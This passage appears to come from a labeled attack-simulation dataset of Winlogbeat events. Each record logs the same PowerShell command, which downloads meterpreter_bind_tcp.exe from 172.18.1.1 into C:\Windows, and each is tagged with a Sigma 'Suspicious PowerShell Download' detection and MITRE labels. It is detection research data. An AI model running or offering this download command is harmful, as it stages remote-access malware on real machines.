{"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", 